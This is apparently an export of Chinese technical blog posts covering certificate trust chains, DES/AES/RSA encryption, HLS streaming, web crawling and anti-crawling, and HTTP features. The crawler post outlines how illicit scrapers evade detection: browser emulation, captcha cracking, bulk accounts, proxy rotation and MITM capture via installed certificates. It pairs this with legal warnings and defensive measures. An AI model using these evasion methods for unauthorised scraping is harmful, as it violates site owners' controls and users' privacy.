Authority，CA）是一家证书颁发机构。 浏览器并不需要理解 GlobalSign 是谁，在验证过程中，浏览器会查找操作系统中，是否已经安装了 GlobalSign 的证书。如果已经安装了，浏览器就会相信这个证书。操作系统的提供商，比如微软、苹果、谷歌总不会恶意安装非法证书砸自己的招牌。只要用户本机安装了 GlobalSign 证书，那么 GlobalSign 证书的公钥就应该可以解密网站证书的签名，得到网站证书的摘要，那么就可以信任 GlobalSign 签发的这张拉勾的证书。 如果操作系统中没有安装 GlobalSign 的证书该怎么办呢 浏览器会去 GlobalSign 的网站下载证书 浏览器会看 GlobalSign 证书上有没有签发方 如果有，递归进行检查签发方的证书是否安装在操作系统本地，直到找到根证书 根证书的特点是没有其他机构为它签名，操作系统安装的时候，会预装一些证书（根证书），能签发根证书的机构就是根证书提供商，所以不要乱装盗版操作系统。 中间的是中间证书机构，它们自己的证书是由 Root CA 签名颁发的，同时向最底层的终端机构提供证书，犯罪分子如果想要伪造证书，那么它的证书就需要获得中间证书提供商的签名，而获得签名需要购买证书。犯罪分子就算购买了证书，也只能购买自己域名的证书，因此无法伪装成其他网站。但要特别注意的是，如果犯罪分子设法在你的个人电脑上安装了它的根证书，那后果就严重了，它可以冒充成任何网站。 总结总结下，解决信用不是一个数学问题。基于信任关系塑造信用是当今社会的主流做法，比如基于社交关系的信用、基于国家机器的信用、基于公司信誉的信用……另一方面，当然工具也是必不可少的。 摘要，是一种数学的证明，本身体积很小，还不存在密钥管理和分发问题，适合在网络环境中工作。在摘要上用私钥加密就是签名，签名可以防止数据被篡改、伪造等。在摘要和签名的基础上，可以利用原本的社会关系，让一些信用优秀的机构提供信用，这就是证书的颁发和信用链体系。 当用户用浏览器打开一个 HTTPS 网站时，会到目标网站下载目标网站的证书。接下来，浏览器会去验证证书上的签名，一直验证到根证书。如果根证书被预装，那么就会信任这个网站。也就是说，网站的信用是由操作系统的提供商、根证书机构、中间证书机构一起在担保。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"}]},{"title":"对称与非对称加密","slug":"计网/对称与非对称加密","date":"2021-07-11T17:59:49.000Z","updated":"2021-07-12T05:07:48.413Z","comments":true,"path":"2021/07/12/计网/对称与非对称加密/","link":"","permalink":"https://www.shanghua.live/2021/07/12/%E8%AE%A1%E7%BD%91/%E5%AF%B9%E7%A7%B0%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","excerpt":"","text":"对称与非对称加密在我们平时生活当中，两个人有不想让第三者知道的事情，可以找一个私密的空间去聊。而互联网本身是一个开放的体系，双方在交换数据的时候会经历大量的第三者——公司的防火墙、ISP 的路由器，还有可能有黑客抓取数据。那么这个时候如果张三和李四有私密的话想聊，该怎么办呢？当然是加密传输，想办法让双发传输的数据只有双方才能理解。 对称加密中国古代有藏头诗，比如“拉君时一登，勾芒司节令，教俗养鸡豚，育德德何成”，藏的头就是拉勾教育。如果张三把这首诗通过互联网发送给李四，那么其实张三在和李四说“拉勾教育”。张三把“拉勾教育”写成藏头诗，李四破解藏头诗还原内容，前者叫作数据的加密，后者叫作解密。 但是上面并不是一种很好的加密方式。一方面藏头诗要作诗，诗要押韵，这个消耗计算资源。另一方面，藏头诗数据传输效率太低，5 个字才对应一个字，不可取。还有就是藏头诗太容易被破解，假设已知是藏头诗，那么只需要提取每句的第一个字就好了。 最简单的加密算法假设你要加密数字 1234，假设 x 的补是 10 - x，那么取补就是得到 9876 假设有三种去补操作： 前两个数字取补，后两个不变得到：9834。记做 1 号方案 后两个数字取补，后两个去补，得到 9876，记作为 3 号方案 全部去补，得到 9876,记作 3 号方案 增加两种换序操作，以 1234 为例 相邻数字交换，得到 2143 记作 4 号方案 数据对半交换，得到 3412 记作 5 号方案 可以设计一个加密过程，去补和交换操作交替进行，一共进行 4 次 如果是 1-4-2-5 就代表一种加密顺序，一 1234 为例 前两个数字去补，得到 9834 相邻数据交换，得到 8943 后两个数字去补，得到 8967 数据对半交换得到 6789 解密的时候就可以逆着上述操作即可 数据对半交换得到 8967 后两个数字取补 8943 相邻数据交换 9834 在过程中，对 5 种加密方案的定义、以及约定进行 4 次交替取补、换序操作称为加密算法 1-4-2-5, 在描述是在过程中的具体方案，是秘钥 双方加密解密都用相同的秘钥的算法称之为对称加密算法 在实际的操作过程当中，因为都是针对二进制的操作，取补操作可以用异或操作来代替 在其中的某些步骤可以拿数据和秘钥进行位运计算，具体不同加密算法实现不同 数据加密标准（DES）算法在 1976 年 DES 算法被美国国家标准局定为使用标准，后来被广泛传播，目前已经被证明可以被暴力破解。所谓暴力破解遍历所有可能的秘钥解释数据。举个例子，已知张三和李四传输的是中文，加密算法是 DES，那么拿出一小段数据进行暴力破解，尝试所有的密钥，如果能成功解析出中文词语（词语在词库中可以查到），那么说明破解成功。 DES 采用的是 56 位秘钥，每次计算加密 64 位的数据，一个通用的暴力破解算法需要较大的算力，一些 DES 的破解算法需要 2^39 - 2^46 次操作，目前还没超出人类计算的极限，显卡好一点或者设备强一点就可以破解 所以目前会使用 3 次 DES 操作来增加破解成本 用 3 个 56 位秘钥组合成一个 168 位的秘钥，对数据进行 3 次 DES 的操作，目前针对 3DES 仍然有一些攻击策略，需要 2^90 次计算和 2^88 位内存，虽然有概率攻破，但是成本很高 AES 加密算法为了应对暴力破解等问题，很多团队选择对称加密算法时已经开始使用高级标准（AES），这个加密法用 128 位秘钥，并设计了更难的破解的算法，如果你在项目中需要使用对称加密，即可使用这个算法 对称加密的缺陷如果你是一个网站提供服务给用户，你和用户之间如果使用对称加密，那么需要为每个用户定时生成一个不同的秘钥，如果所有用户使用通用的秘钥，那么一个用户就能通过自己的秘钥获取到其他用户的数据，一个 UV 在 1000W 的网站，如果每天需要给每个用户生成一次秘钥，也就是 1000W 次计算，按照现在集群的能力，每秒做到生成 1000 W个秘钥有什么难度呢？如果客户端不慎遗失秘钥，让黑客拿到的后果呢 黑客可以轻易伪装成客户端和服务器进行通讯 站对称加密中，加密解密用的一个秘钥（加密是正向过程，解密是逆向过程） 非对称加密为了进一步提升安全系数，数学家还提出了非对称加密。在非对称加密中，加密和解密用的不是一个密钥。类比生活中的场景，如果一个礼物箱子，开锁和上锁用的是不同的钥匙会发生什么？只拥有上锁钥匙的人，可以把礼物放到箱子里，但是他只有一次机会，也就是一旦他将礼物上锁，即便反悔了也没法再打开箱子。而收礼物的人只能开箱子取走礼物。如果放礼物的人丢了钥匙，箱子也不会被中间人打开。这个例子类比网络传输的世界，可以防止数据被监听、盗用、篡改…… 当我们开发一个网站，我们的用户之间的通信用非对称加密。用户发送请求时，用户用一把钥匙加密数据，网站用另一把钥匙解密。在这个过程中，网站拥有的钥匙称为私钥，用户拥有的钥匙称为公钥。之所以这样称呼，是因为很多用户可以共用一把公钥，而只有网站才拥有私钥。 公钥发送的数据必须用私钥解密，私钥发送的数据必须使用公钥解密 网站发送数据加密用私钥，用户用公钥解密 用户发送数据用公钥，网站用私钥解密 即使用户公钥被盗，也无法获得私钥解密内容 如果黑客要拿到私钥会怎么做呢？ 雇佣特工潜入物理机房 在该网站员工的机器上植入木马 买通公司内部员工gouk …… 秘钥的创建在非对称加密中，密钥通常由提供服务的一方创建。每次创建是一对公私钥对，然后提供者将公钥给用户，自己保留私钥。值得一提的是，我们在 Linux 环境可以用 openssl 创建公私钥对。 1openssl genrsa -des3 -out privkey.pem 2048 然后基于私钥生成公钥 1openssl rsa -in privkey.pem -inform pem -pubout -out pubkey.pem 常见非对称加密算法 目前常见且广泛使用的非对称加密算法是 RSA 算法。RSA 依赖的是大整数的分解，以及一些和素数相关的算法，目前没有理论可以破译 RSA 算法，总体来说 RSA 私钥越长破解成本越高，因此仍然被广泛使用。其他的非对称加密算法还有 DSS、ELGamal 等 常见的应用场景非对称加密算法目前广泛应用到各个领域，比如 HTTPS 协议的握手和交换密钥过程需要非对称加密算法；SSH 的通信需要非对称加密算法。另外，证书的生程，比如利用证书实现 git 账号的免密操作也是基于非对称加密算法。在线合同、数字货币的签名等都需要非对称加密算法。 总结那么是不是我们所有的加密的应用都应该用非对称加密呢？ 非对称加密需要更多的运算资源 很多协议使用非对称加密解决最核心的安全问题，再用对称加密解决其他问题 HTTPS 协议为例，客户端和服务器之间会先用非对称加密交换临时对称加密密钥，然后之后的通信以对称加密执行，直到连接结束 对称加密和解密可以用同一套密钥 非对称加密利用数学的方法生成公私钥对，公钥加密的数据私钥可以解密，私钥加密的数据公钥可以解密","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"}]},{"title":"流媒体技术","slug":"计网/流媒体技术","date":"2021-07-08T11:02:48.000Z","updated":"2021-07-08T04:44:46.518Z","comments":true,"path":"2021/07/08/计网/流媒体技术/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/%E6%B5%81%E5%AA%92%E4%BD%93%E6%8A%80%E6%9C%AF/","excerpt":"","text":"流媒体技术在流媒体计数不发达的时代，数据往往是以单个文件的形式存在的，十多年前下载电影（每秒十多 k 的网速），需要等待视频下载完毕来看，往往要花废很多时间 如何将一个视频抽象成流呢？就是传输一部分即可播放一部分，在实际的操作当中，设计了一种类似目录的格式，将音视频数据进行切片，这部分能利用现有的工具 FFmpeg 就可以轻松做到 安装 FFmpeg，利用指令处理一个 MP4 文件，就可以生成很多切片和目录文件 1ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -2 -f hls output.m3u8 上面将input.mp4切割成HTTP Live Streaming 可以播放的切片（大多数浏览器中的播放器都可以播放）。最终会生成大量的切片文件，比如说每个 256k，以及一个目录文件 output.m3u8。 下图展示的是用 FFmpeg 在我的机器上对 input.mp4 操作生成的文件清单： m3u8 文件是目录，它记录了每个视频切片文件（ts）对应的视频时间范围。用户播放视频的时候，会先下载 m3u8 文件。当用户调整视频播放滑块选择播放时间时，播放器就根据 m3u8 的内容下载对应的 ts 文件。 基于流媒体的架构flowchart LR A[视频] --&gt; B{编码} B --&gt; C[流媒体服务] C --4k--&gt; D[支持 4k 设备] C --1080p--&gt; E[支持 1080p 设备] 视频录制完成后，可能是 MP4 等格式。首先，我们将视频上传到服务器进行编码，产生上面提到的切片文件。切片文件存储到流媒体服务器中，当用户需要的时候，就从流媒体服务器中读取视频目录（上面的 m3u8 文件），然后在各个端播放。进行编码的时候，可以根据不同的清晰度编码多个版本，来应对用户在不同网络环境的情况。 直播直播技术仍然可以复用上面的这套架构。录制端不断上传视频内容，视频内容编码后流媒体服务器负责分发。如果观看人数较多，可以使用 CDN 回源到流媒体服务器。对于直播，m3u8 文件可以看作一个动态的文件，能够不断产生新的数据。因此直播技术中，可以考虑将获取 m3u8 文件设计成一个接口，不断由播放器请求新的 m3u8 文件。 其他音视频网站 将视频编码后（含切片），然后利用 CDN 分发目录和切片文件，就可以播放了 视频的编码和解码 通常视频文件较大，因此在传输前通常需要压缩 在播放前需要解码 视频的压缩技术：是针对视频的特征进行处理的压缩技术，与文件压缩技术是不同的，可以把视频看成一直连续的图片，主要是依靠的人类视觉的残留效应 ，视频的压缩也是如此，本质上是对图片的压缩 视频的前一个画面和后一个画面衔接紧密 在连续的多张图片中，也会有重复出现的事物 另外，在连续的多张图片中，也会有重复出现的事物，比如说一座桥、一间教室都可能多次出现。因此，视频压缩可以根据这些特性进行抽象。 对视频进行压缩的时候，视频文件格式也和压缩算法息息相关，我们统称为视频的编码。视频需要编码，包括如何描述目录、如何描述切片、如何存储声音，这些都是编码要考虑的。一个完整的解决方案，我们称为一套视频的编码。比如说 H264 就是国际标准化组织在推广的一种编码格式。当然，所有特性的核心是在减少视频体积（网络传输）的基础上，尽可能地提供更高的画质；另一方面就是要尽可能减少中间编码/解码的时间成本（机器资源）。 宏块在包括 H264 的很多视频编码技术中，都有一个叫作宏块的概念。宏块，就是将画面分成大小不等的区域。比如说 8x8、16x16 等。 当播放两个连续的画面的时候，你可以理解成两张图片。但是如果基于图片分析，那么播放的就是很多个宏块。在这连续的两帧画面中，并不是所有的宏块都发生了变化。特别是当你看一些教学 PPT 的讲稿时，视频前后两帧的宏块基本没有发生变化。因此往往相同画质、相同时长的教学视频体积会远小于电影视频的体积。 具体的压缩算法不在本次课程的涵盖范围之内，如果你感兴趣可以自己去查资料了解一下，参考分组、帧、预测帧等概念。 点到点视频技术在视频会议、面对面聊天等场景下，需要点到点的视频技术 flowchart LR A[Host1] --上传--&gt; B[编码] B --&gt; C[分类] C --&gt; D[分发] D --下载-解码-播放--&gt; E[Host2] 理论上说也可以使用上面的架构，一个客户端将自己本地录制的视频用二进制上传，在服务端编码然后分发到另一个端。数据在另一个端解码并播放。 这样做的缺点是链路较长，于是在实际操作的过程中如果是 1 对 1 的视频聊天，可以考虑实现点到点的服务。 flowchart LR A[Host1] &lt;-----UDP&amp;nbsp等------&gt; B[Host2] 不过不同的主机可能在私有网络 flowchart LR subgraph 内网 A[Host1] &lt;----&gt; B[NAT + 路由器] end B &lt;----&gt; Host2 你会发现如整个设计中需要一个 NAT 路由器，这样客户的数据才能回传到拉勾内网的机器。而实际情况并没有这么简单，在 NAT 通信中，往往需要在内网的主机发起连接。这个时候 NAT 模块识别发起的端口并记录。换句话说，如果某客户的机器是公网 IP，那么内网内部的主机可以找到这个客户，找到之后，双方建立连接。但是某位客户如果想主动发起向内网某台机器的连接，这其实是做不到的。 如果双方都在内网中，都需要 NAT 的场景，其实是无法通信的 flowchart RL subgraph 内网 2 direction LR C[Host2] &lt;----&gt; D[NAT + 路由器] end subgraph 内网 1 direction LR B[NAT + 路由器] &lt;----&gt;A[Host1] end B &lt;---&gt; D 上图这种情况，拉勾内网发起连接，对方的 NAT 路由会因为自己内网的机器没有发起过请求而拒绝；反之，如果客户发起请求，会被拉勾的 NAT 拒绝。这种情况类似于多线程中的“死锁”问题，无法解决。这个时候，就需要一台第三方服务器作为 NAT 模块的辅助功能，帮助双方的 NAT 模块设置本地数据，让双方的 NAT 模块都认为对方已经和自己发起过通信。这个解决方案也叫作NAT 穿透（NAT 穿墙）。 在著名的 WebRTC 协议中，可以提供网页版的在线 1 对 1 聊天，对于多数家庭到家庭的网络来说，是可以正常工作的。如果当你需要连接两个内网的机器，这个时候就需要自己架设第三方服务，或者使用某个收费的第三方服务。 对于在线会议的场景，如果人数较少的情况下，仍然可以使用点到点技术，只不过传输量会随着人数的上升而呈爆发式增长。所以在人数较多的时候，就需要更多的优化策略。当然，其中一种方案就是放弃点到点技术，而直接采用类似直播架构的中心化服务。另一种策略就是利用边缘计算，让距离相近的参会者利用共同的离自己最近的服务器交换数据。 总结视频本质上是一张张图片在播放，因此非常适合流传输。要知道，流是随着时间产生的数据。通常在一个网络中，等价成本下吞吐量、丢包率和延迟 3 者不能兼得。也就是说，像直播这种吞吐量非常大的视频应用，可能就要牺牲延迟。比如之前 B 站直播没有优化前，用户看到的直播画面会比真实的时间会慢近半分钟。 另一方面，像在线会议这类对延迟要求较高的场景，就可能需要降低视频质量，或者部署边缘服务。如果是内网视频会议，或者跨地区的公司视频会议，很容易找到边缘节点帮助交换数据和计算；如果是来自天南地北的用户，那么就需要投入更多成本。对于社交网站而言，需要维护几个人同时语音、视频聊天，因为人数较少，就可以使用点对点技术（但是要解决 NAT 穿墙的问题）。 直播是如何实现的？ 录制端：负责录制直播视频，用流的形式上传。 计算集群：专门负责编码上传的流数据，然后进行压缩、转码、切片等工作。 对象存储：存储原始视频和转码后的视频（相当于 CDN 的源，回源用）。 CDN：将转码后的内容分发到离用户较近的节点，方便用户获取。 直播 App：给用户看直播时使用。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"爬虫和反爬虫","slug":"计网/爬虫和反爬虫","date":"2021-07-08T11:02:48.000Z","updated":"2021-07-08T05:55:25.822Z","comments":true,"path":"2021/07/08/计网/爬虫和反爬虫/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/%E7%88%AC%E8%99%AB%E5%92%8C%E5%8F%8D%E7%88%AC%E8%99%AB/","excerpt":"","text":"爬虫和反爬虫早期一些购票网站起家的时候，就大量使用爬虫技术爬取航空公司的数据，为了不让航空公司屏蔽，特意用了很多个人电脑做爬虫端，让航空公司无法分清哪些是爬虫、哪些是用户一些相互竞争的电商、外卖公司，内部甚至会设立专门的数据爬取小组，用户监控竞品的数据，并且实时地调整业务的竞争策略—-如补贴、签约等黑产利用招聘网站的漏洞，爬取并出售简历数据，再出售给不法分子 爬取数据违法吗首先，爬取一个网站的数据，很可能是违法行为。通常一个网站，会在自己根路径下的 robots.txt 中定义自己网页中哪些数据是可以用来爬取的。从理论上讲，如果你想爬取一个网站的数据，应该先获取它根目录下的 robots.txt 文件，查阅文件内容，看自己要爬取的数据是否被允许。 下面是 bilibili 的 robots.txt 的内容： 12345678910111213141516171819202122User-agent: YisouspiderAllow: /User-agent: ApplebotAllow: /User-agent: bingbotAllow: /User-agent: Sogou inst spiderAllow: /User-agent: Sogou web spiderAllow: /User-agent: 360SpiderAllow: /User-agent: GooglebotAllow: /User-agent: BaiduspiderAllow: /User-agent: BytespiderAllow: /User-agent: PetalBotAllow: /User-agent: *Disallow: / 可以看到，如果你是谷歌、苹果、360、百度等搜索引擎，那么 B 站是欢迎你爬取内容的。如果你是其他的个人或者组织，比如说你想爬取 B 站上所有大 V 的数据，然后将分析结果出售给其他人（比如某个 MCN 平台），实际上是触犯法律的。依据我国的刑法，你可能会被判处非法获取计算机信息系统数据罪，情节严重的可能会被判处 3 年以上的有期徒刑并处罚金。 助点机器人在没有允许的情况下爬取对方的数据是违法行为。但是 这里衍生出一个问题，比如说，你是一个拉勾的付费用户，你觉得拉勾的界面不够智能，于是你自己写了一个程序，只针对自己的账号范围实现某个功能，对拉勾的简历进行筛选，从而找到合适的求职者，这是违法行为吗？ 这个行为不是违法行为。这个行为可以归结成你自己做的一个辅助自己工作的机器人，但是如果你将这个工具提供给其他人，这是违法行为吗？其实也不是违法行为。但是如果其他人将这个工具用作黑产，比如说爬取用户的数据然后进行简历信息的买卖，这就构成了违法行为，构成犯罪的是买卖简历信息。如果你是拉勾的竞品，你使用大量账号这样做，还会构成非法竞争。 换一个例子，有人觉得 Github 不够智能，然后做了一个插件，帮助大家浏览 Github 中文件代码的目录树，本质上这个工具也需要用到爬虫的部分技术——需要爬取这个目录树。但这不是违法行为，但若有人利用类似的工具，将 Github 全部代码都拿走，在淘宝上打包售卖，这就是违法行为了。 爬虫的原理本质上就是一次网络请求，然后将返回的数据保存下来对于搜索引擎的爬虫而言，通常会在请求头上加上自己的标识，比如百度会加上 baidu 字符串,这样方便网站服务器识别 爬虫如果是非法的，往往就需要伪装成浏览器。通常会用到浏览器内核去模拟发出网络请求，比如用 Chromium（Chrome 的开源内核）就可以提供这样的能力。 当你用 Chromium 发起请求的时候，对于服务提供方的反爬虫系统，你的请求就变成了一次标准的用户行为。如果对方网站需要登录才能爬取数据，这个时候，不法分子还会模拟登陆行为。如果仅仅是输入用户名和密码，那这个网站登录行为会非常容易模拟，只需要找到对方对应的接口，把用户名和密码传过去，就可以拿到访问资源的令牌。这就是大部分网站登录时需要你用手机验证码登录、微信扫描、或填写图片验证码的原因。 对于一些获取数据还需要付费的网站，比如说视频网站或拉勾这样的招聘网站，用户需要付费才能获取核心的数据，这个时候不法分子可能会购买大量的账号。为了防止不法分子获得大量的账号，现在国家已经在严打销售手机卡号的行为。所以请你记住，使用其他人的身份去注册账号，这也是一种违法行为。 关于验证码当被爬取的网站登录接口有验证码时，爬虫的设计者通常会有两种手段。一种是破解验证码，在现在这个人工智能的时代，想要破解验证码只需要获得足够多的验证码图片样本，然后用 tensorflow 分析一下，基本上都可以做到一定的识别率，可以高于 80% 以上。所以现在的网站往往不会使用简单的图片验证码，比如说要拖动一个滑块、选中几张图片、算一道数学题等来增加破解成本。我见过最变态的网站验证码是一道化学题，我花了两个小时才注册成功。 所以你的网站如果还在使用普通的图形验证码，而你网站被攻克的代价也很高的话，请你务必早点更换验证码——更换成更难破解的，甚至多种验证码的混合。 模拟用户动作对于一个爬取数据用的浏览器内核，往往还提供了模拟用户行为的功能。比如说点击按钮，滚动一下页面，输入一行文字。所以千万不要觉得，爬虫模拟不了这些用户行为，对于爬虫的设计者，这些都是基础操作。 数据的提取当数据被下载下来之后，爬虫会尝试将原始数据存储，然后再进行离线分析。当然有的爬虫爬取了数据之后就马上进行分析。如果要爬取网页数据，后续会用到 HTML 的解析器（Parser），这个在 Github上 可以找到很多的开源实现。如果是爬取的接口数据，通常就是分析 Json。有的网页数据是由 JavaScript 渲染的，这种网页，通常爬虫会模拟浏览器的行为，在页面加载完成几秒之后才开始下载网页内容。 反追踪对于黑产的爬虫，还会进行 IP 的反追踪。所谓 IP 的反追踪，就是利用代理，增加追踪的成本。比如黑客在从事犯罪活动时通过多次代理，跨了多个国家，那么一个国家的警方力量就很难追踪到他。在爬虫领域有很多人会购买 IP 代理，比如说一个非法的去 B 站收集统计数据的爬虫，为了防止 B 站的追诉以及防止 B 站安全策略的屏蔽，可能会购买大量的 IP，然后模拟成几百个用户在使用 B 站。你要注意，临时租用大量 IP 地址的价格低廉，这也大大降低了犯罪的成本。 反爬虫接下来，我们说说有关反爬虫的一些基本的操作。 robots.txt在反爬虫的时候，第一步我们要先从法律上告诉爬虫哪些页面是不可以爬取的。所以我们要先写好自己的 robots.txt，并放到网站的根目录。 用户的识别接下来我们对于高频访问的 IP 要予以关注。当然，仅仅通过 IP 来判断是不可取的。因为有的时候一家公司会共用一个 IP 出口地址。举个例子：一家猎头公司下面的几百个猎头，可能会每天疯狂的使用拉勾，因此从拉勾的数据上，你会看到大量的重复 IP 访问。这个时候我问你个问题，你禁不禁用这些 IP？当然不能禁用，这些都是付费用户。 那么这个时候有一件非常值得做的事情，就是使用设备的指纹。对于一个设备，它的 CPU 数量、CPU 序列号、屏幕的分辨率、手机的厂商等，通常是固定的。这样可以结合 IP 地址做精细去重。这项技术被称为设备指纹，就是利用设备上的信息，生成一个具有唯一性的字符串，因为这种生成算法是非标准化的，因此不同的数据安全团队会有自己的算法。 有了对用户的识别，就可以根据唯一用户设置数据安全策略，比如访问频次、黑名单等。 字体加密再介绍一种方法是自己实现字符编码和字体文件，增加爬虫爬取数据的成本。 爬虫爬取的通常就是用户本身可以看到的内容。如果自己实现一套自己的字符编码。比如将 UTF8 编码中的汉字打乱顺序，然后再将字体文件中对应的数据换序，得到字体文件。显示简历的时候，使用自己根据这个字符集生成的字体文件。 这样，爬虫下载到网页数据后，中文会乱码，这是因为爬虫无法理解我们创造的非标准字符集编码。当用户看到网页的时候，可以看到正确的内容，这是因为字体文件起了作用。即便爬虫将字体文件打开，和编码对应上，也是非常复杂的一个体力劳动。然后我们每天更换一次顺序，就可以给黑产增加相当大的爬取成本。 加密传输对于移动端 App 中的数据，如果可以加密传输，也能大大增加爬取成本。因为 App 不是浏览器，想要模拟一个 App 是非常困难的。那么 App 的数据抓取就依赖于 App 数据传输使用的标准协议，比如一个用 HTTPS 协议传输数据的 App，爬虫可以在 App 端安装证书，然后再利用代理实现中间人抓包。但如果数据用自己的协议加密，那么爬虫抓包的同时，还必须能够破解这个加密协议。 总结非法爬取数据是不可能完全杜绝的，我们只能提高非法爬取数据的成本。但是一定要有数据安全的意识。在互联网的世界里，数据是第一生产力，也是生命线。在完成开发工作之余，利用自己的专业知识适当提高爬取数据的成本是非常有必要的。 如果自己被公司要求写一个爬虫爬取竞品数据，请你先阅读下竞品的 robots.txt 文件，看看允不允许你这样做。如果这是一个违法行为，那么也可以适当提醒下有这样想法的决策者。 国家对网络信息安全犯罪的打击，只会越来越严。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"HTTP 协议","slug":"计网/HTTP协议","date":"2021-07-08T09:02:56.000Z","updated":"2021-07-08T02:03:23.189Z","comments":true,"path":"2021/07/08/计网/HTTP协议/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/HTTP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTP 协议1990 年蒂姆·伯纳斯·李开发了第一个浏览器，书写了第一个 Web 服务器程序和第一张网页。网页用的语言后来被称作超文本标记语言（HTML），而在服务器和客户端之间传输网页的时候，伯纳斯·李没有直接使用传输层协议，而是在 TCP 的基础上构造了一个应用层协议，这个就是超文本传输协议 HTTP。 万维网（World Wide Web，WWW）是博纳斯·李这一系列发明，包括 Web 服务、HTTP 协议、HTML 语言等一个体系的综合 请求响应和长连接HTTP 协议采用请求/返回模型。客户端（通常是浏览器）发起 HTTP 请求，然后 Web 服务端收到请求后将数据回传。 HTTP 的请求和响应都是文本，你可以简单认为 HTTP 协议利用 TCP 协议传输文本。当用户想要看一张网页的时候，就发送一个文本请求到 Web 服务器，Web 服务器解析了这段文本，然后给浏览器将网页回传。 Web 服务器内部就设置一个定时器。在一定范围的时间内，如果客户端继续发送请求，那么服务器就会重置定时器。如果在一定范围的时间内，服务器没有收到请求，就会将连接断开。这样既防止浪费握手、挥手的资源，同时又避免一个连接占用时间过长无法回收导致内存使用效率下降。 我们可以利用 HTTP 协议头进行配置，列如 Keep-Alive: timeout=5s 会告诉 Web 服务器连接的持续时间是 5s，如果 5s 内没有请求，那么连接就会断开 在最初版本是并没有 Keep-Alive 的，随着版本升级，在 HTTP 1.1 才最终支持 Keep-Alive HTTP 2.0 多路复用当一个网站需要加载的资源较多时，浏览器会尝试并发发送请求（利用多线程技术），浏览器会限制同时发送并发请求的数量，通常是 6 个，这样做一方面是对用户本地体验的一种保护，防止浏览器抢占太多网络资源，另一方面也是对站点服务的保护，防止瞬时流量过大 在 HTTP 2.0 之后，增加了多路复用能力。与 RPC 多路复用类似，请求、返回会被拆分成切片，然后混合传输。这样请求、返回之间就不会阻塞。在 HTTP 1.1 的 Keep-Alive 设计中，第二个请求，必须等待第一个请求返回。如果第一个请求阻塞了，那么后续所有的请求都会阻塞。而 HTTP 2.0 的多路复用，将请求返回都切分成小片，这样利用同一个连接，请求相当于并行的发出，互相之间不会有干扰。 HTTP 方法和 RestFul 架构RestFul 是三个单词的缩写 re（Representational）、St（State）、Ful（Transfer） 在 RestFul 架构中，状态仅仅存在于服务端，前端无状态。状态（State）可以理解为业务的状态，这个状态是由服务端管理的。这个无状态和服务端目前倡导的无状态设计不冲突，现在服务端倡导的无状态设计指的是容器内的服务没有状态，状态全部存到合适的存储中去。所以 Restful 中的 State，是服务端状态。 HTTP 方法在 Restful 架构中，除了约定了上述整体架构方案之外，还约束了一些实现细节，比如用名词性的接口和 HTTP 方法来设计服务端提供的接口。 我们使用 GET 获取数据，或者进行查询,如下代码的作用就是获取订单为 123 的订单数据 1GET /order/123 GET 是 HTTP 方法，/order 是一种名词性质的命名，这样设计语义非常清晰，这个接口是获取订单的数据，也就是订单的 Representation 用的 对于更新数据的场景，可以使用 PUT 方法，根据 HTTP 协议规定，PUT 是一种幂等的更新行为，POST 是一种非幂等的更新行为。 12PUT /order/123 &#123;...订单数据&#125; 上面使用 PUT 更新订单，如果订单 123 还没有创建，那么这个接口就会创建订单。如果 123 已经存在，那么这个接口会更新订单 123 的数据，因为 PUT 代表幂等，对于一个幂等的接口，请求多少遍最终的状态是一致的，也就是说操作的都是同一笔订单 如果换成 POST 更新订单： 12POST /order&#123;...订单数据&#125; POST 代表非幂等的设计，像上面这种用 POST 提交表单的接口，调用多次往往会产生多个订单。也就是非幂等的设计每次调用结束后都会产生新的状态。 另外在 HTTP 协议中，还约定了 DELETE 方法用于删除数据。其实还有几个方法，请大家自行查找相关资料，比如 OPTIONS PATCH 缓存在 HTTP 的使用中，我们经常会遇到两种缓存，强制缓存和协商缓存，接下来我举两个场景来说明。 强制缓存你的公司用版本号管理某个对外提供的 JS 文件。比如说 libgo.1.2.3.js，就是 libgo 的 1.2.3 版本。其中 1 是主版本，2 是副版本，3 是补丁编号。每次你们有任何改动，都会更新 libgo 版本号。在这种情况下，当浏览器请求了一次 libgo.1.2.3.js 文件之后，还需要再请求一次吗？ 整理下我们的需求，浏览器在第一次进行了GET /libgo.1.2.3.js这个操作后，如果后续某个网页还用到了这个文件（libgo.1.2.3.js），我们不再发送第二次请求。这个方案要求浏览器将文件缓存到本地，并且设置这个文件的失效时间（或者永久有效）。这种请求过一次不需要再次发送请求的缓存模式，在 HTTP 协议中称为强制缓存。当一个文件被强制缓存后，下一次请求会直接使用本地版本，而不会真的发出去。 使用强制缓存时要注意，千万别把需要动态更新的数据强制缓存。一个负面例子就是小明把获取用户信息数据的接口设置为强制缓存，导致用户更新了自己的信息后，一直要等到强制缓存失效才能看到这次更新。 协商缓存我们再说一个场景：小明开发了一个接口，这个接口提供全国省市区的 3 级信息。先问你一个问题，这个场景可以用强制缓存吗？小明一开始觉得强制缓存可以，然后突然有一天接到运营的通知，某市下属的两个县合并了，需要调整接口数据。小明错手不急，更新了接口数据，但是数据要等到强制缓存失效。 为了应对这种场景，HTTP 协议还设计了协商缓存。协商缓存启用后，第一次获取接口数据，会将数据缓存到本地，并存储下数据的摘要。第二次请求时，浏览器检查到本地有缓存，将摘要发送给服务端。服务端会检查服务端数据的摘要和浏览器发送来的是否一致。如果不一致，说明服务端数据发生了更新，服务端会回传全部数据。如果一致，说明数据没有更新，服务端不需要回传数据。 